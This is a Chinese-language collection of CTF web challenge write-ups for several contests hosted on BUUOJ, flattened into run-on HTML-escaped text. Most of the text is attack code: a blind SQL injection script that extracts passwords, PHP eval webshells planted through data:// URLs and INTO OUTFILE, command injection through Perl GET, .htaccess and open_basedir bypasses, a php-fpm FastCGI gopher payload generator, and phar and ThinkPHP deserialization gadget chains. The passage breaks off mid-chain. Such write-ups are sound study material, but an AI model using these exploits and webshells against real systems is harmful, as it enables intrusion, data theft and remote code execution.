?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); sql注入 单引号肯定是不可能的了 使用反引号将&#123;$id&#125;后面的单引号转义 payload: 1image.php?id&#x3D;\\0&amp;path&#x3D; or sleep(3)%23 sql注入exp: 123456789101112131415161718192021222324252627282930313233343536import requestsurl=&#x27;http://446ffbda-4afb-4548-a9ab-c9229046a02f.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&#x27;flag=&#x27;&#x27;proxies = &#123; &#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1 = &#x27; or if(ascii(substr((select group_concat(password) from users),&#123;&#125;,1))=&#123;&#125;,1,0)%23&#x27;.format(str(i),str(mid)) p2 = &#x27; or if(ascii(substr((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&#x27;.format(str(i),str(mid)) try: r1=requests.get(url+p1) print(i,mid) if len(r1.text)&gt;1000: flag+=chr(mid) print(flag) break r2=requests.get(url+p2) if len(r2.text)&gt;1000: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: breakprint(flag)# ciscnfinal# images,users# username,password# 18c2c26e6a0c9a228f2e 登陆进来是一个上传点 上传发现会把文件名记录在一个php文件中 直接文件名插入php代码 由于过滤了php 使用短标签绕过 [Zer0pts2020]Can you guess it?writeup源码 12345678910111213141516171819202122&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if (hash_equals($secret, $guess)) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . FLAG; &#125; else &#123; $message = &#x27;Wrong.&#x27;; &#125;&#125;?&gt; 搜了搜hash_equals random_bytes貌似也没什么bypass的手段 先说下 1$_SERVER[&#39;PHP_SELF&#39;] 表示当前执行脚本的文件名 例如，在地址为 http://example.com/foo/bar.php 的脚本中使用 $_SERVER[&#39;PHP_SELF&#39;] 将得到 /foo/bar.php 这里没啥问题主要是basename函数处理时 这里有涉及一些trick了 basename会删除一些不可显示字符 这里有个脚本验证 123456789101112&lt;?phpfunction check($str)&#123; return preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $str);&#125;for ($i = 0; $i &lt; 255; $i++)&#123; $s = &#x27;/index.php/config.php/&#x27;.chr($i); if(!check($s))&#123; $t = basename($s); echo &quot;$&#123;i&#125;: $&#123;t&#125;\\n&quot;; &#125;&#125;?&gt; 针对这题 构造payload: 1&#x2F;index.php&#x2F;config.php&#x2F;%fa?source [HITCON 2017]SSRFmewriteup12345678910111213141516171819&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]); $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];&#125;echo $_SERVER[&quot;REMOTE_ADDR&quot;];$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);@mkdir($sandbox);@chdir($sandbox);$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));$info = pathinfo($_GET[&quot;filename&quot;]);$dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));@mkdir($dir);@chdir($dir);@file_put_contents(basename($info[&quot;basename&quot;]), $data);highlight_file(__FILE__); 可以写文件 文件名可控 文件内容为命令执行结果 GET咱也不知道是啥命令 直接data://协议就能写shell 懵逼 1?url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;&amp;filename&#x3D;a.php GET命令 搜了搜 发现预期解不是这样 GET 这个命令的存在命令执行漏洞 主要是 perl 的一个特点 在 open函数支持file协议 通过构造特定的payload可以执行命令 并且要执行的命令先前必须要有以命令为文件名的文件存在 该漏洞对应CVE编号CVE-2016-1238 同样 使用open函数也是可以命令执行的 此时不需要文件存在 针对这道题 payload: 列文件 1?url&#x3D;file:ls &#x2F;|&amp;filename&#x3D;ls &#x2F;| 执行文件 1?url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag| 最终创建的文件 [SUCTF 2019]EasyWebwriteup1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) ) die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; 构造无字母数字 绕过长度限制 执行get_the_flag函数 中括号过滤使用大括号 1?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%FF&#125;();&amp;%ff=get_the_flag 上传文件 1234&lt;form action=&quot;http://d6304b81-81f5-4826-a3bf-50203269e06a.node3.buuoj.cn?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%FF&#125;();&amp;%ff=get_the_flag&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 然后使用base64编码的方式绕过对&lt;?的过滤 .htaccess包含 由于路径没有php文件 需要先把gif解析成php 在使用php_value包含 注意这里需要绕过exif_imagetype函数 这里使用如下 不能使用GIF89a 因为.htaccess任何一行不能有错误 而.user.ini却可以 另外还可以使用编码绕过 1234#define width 1#define height 1AddType application&#x2F;x-httpd-php .gifphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;s.gif&quot; 蚁剑连上 bypass_disable_functions绕过open_basedir 预期解是攻击php-fmp.sock 也有提示 对应路径unix:///run/php/php7.2-fpm.sock 参考：https://xz.aliyun.com/t/5598 生成payload: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264#!/usr/bin/python# -*- coding:utf-8 -*-import socketimport randomimport argparseimport sysfrom io import BytesIOfrom six.moves.urllib import parse as urlparseimport base64# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): # self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # self.sock.settimeout(self.timeout) # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # # if self.keepalive: # # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # # else: # # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) # try: # self.sock.connect((self.host, int(self.port))) # except socket.error as msg: # self.sock.close() # self.sock = None # print(repr(msg)) # return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) # 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request #self.sock.send(request) #self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND #self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27; #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; # 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了 #response = client.request(params, content) #print(force_text(response)) request_data = client.request(params, content) print(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + urlparse.quote(request_data)) print(&quot;\\n&quot;) print(urlparse.quote(base64.b64encode(request_data))) 使用： 然后上传这段代码： 1234&lt;?php $sock=stream_socket_client(&#x27;unix:///run/php/php7.2-fpm.sock&#x27;);fputs($sock, base64_decode($_POST[&#x27;A&#x27;]));var_dump(fread($sock, 4096));?&gt; buu的环境好像没弄这个 测了半天没成功 除此之外使用chdir的方式也行 1chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&#x27;/&#x27;)); 具体原理参见一叶飘零大佬的文章：https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ [SWPUCTF 2018]SimplePHPwriteup查看文件处任意文件读取 有open_basedir file.php： 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; function.php： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; class.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 &lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; 有文件上传 有类 明显phar反序列化 poc: 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct() &#123; $this-&gt;str = new Show(); &#125;&#125;class Show&#123; public $source; public $str; public function __construct() &#123; $this-&gt;str[&#x27;str&#x27;] = new Test(); &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;; &#125;&#125;$phar = new Phar(&quot;aaa.phar&quot;); //后缀名必须为 phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$object = new C1e4r();$phar-&gt;setMetadata($object); //将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); 文件名为： 1$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; flag在flag.php [HarekazeCTF2019]encode_and_encodewriteup12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); 主要考察了json_decode这个函数 该函数可以接收utf-8的数据 payload: 1&#123;&quot;page&quot;:&quot;p\\u0068p:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;fl\\u0061g&quot;&#125; [红明谷CTF 2021]EasyTPwriteuptp3反序列化 参见：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA 当时用报错注入做的 后来才知道可以直接写shell md 比赛时不知道咋想的 蚁剑还连不上数据库 冰蝎可以 poc: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true, // 开启才能读取文件 PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, // &quot;hostname&quot; =&gt; &quot;103.152.132.16&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( // &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,substr(concat(0x20,(select group_concat(schema_name) from information_schema.schemata)),2,100),1)#&quot;, // &quot;table&quot; =&gt; &quot;mysql.user where 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;tp&#x27;)));#&quot;, // &quot;table&quot; =&gt; &quot;mysql.user where 1=extractvalue(1,concat(0x7e,(select * from tp.f14g)));#&quot;, // &quot;table&quot; =&gt; &quot;mysql.user where 1=extractvalue(1,mid(concat(0x7e,(select * from tp.f14g)),31,31))#&quot;, &quot;table&quot; =&gt; &quot;mysql.user where 1=0;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e into outfile &#x27;/var/www/html/Application/Runtime/mb2.php&#x27;;#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; $a = new Think\\Image\\Driver\\Imagick(); echo base64_encode(serialize($a));&#125; [强网杯 2019]Uploadwriteupwww.tar.gz有源码 tp5的项目 全局搜索VERSION 在thinkphp/library/think/App.php 看下对应控制器 在application/web/controller/Index.php 并且在登陆的时候也进行了检测 这里直接进行反序列化了 搜下链子找到：https://a2u13.com/2020/01/11/ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;xmhgg&quot;=&gt;[&quot;ls&quot;,&quot;&quot;]]; $this-&gt;data = [&quot;xmhgg&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter; protected $config = [ // 表单请求类型伪装变量 &#x27;var_method&#x27; =&gt; &#x27;_method&#x27;, // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, // 表单pjax伪装变量 &#x27;var_pjax&#x27; =&gt; &#x27;_pjax&#x27;, // PATHINFO变量名 用于兼容模式 &#x27;var_pathinfo&#x27; =&gt; &#x27;s&#x27;, // 兼容PATH_INFO获取 &#x27;pathinfo_fetch&#x27; =&gt; [&#x27;ORIG_PATH_INFO&#x27;, &#x27;REDIRECT_PATH_INFO&#x27;, &#x27;REDIRECT_URL&#x27;], // 默认全局过滤方法 用逗号分隔多个 &#x27;default_filter&#x27; =&gt; &#x27;&#x27;, // 域名根，如thinkphp.cn &#x27;url_domain_root&#x27; =&gt; &#x27;&#x27;, // HTTPS代理标识 &#x27;https_agent_name&#x27; =&gt; &#x27;&#x27;, // IP代理获取标识 &#x27;http_agent_ip&#x27; =&gt; &#x27;HTTP_X_REAL_IP&#x27;, // URL伪静态后缀 &#x27;url_html_suffix&#x27; =&gt; &#x27;html&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace 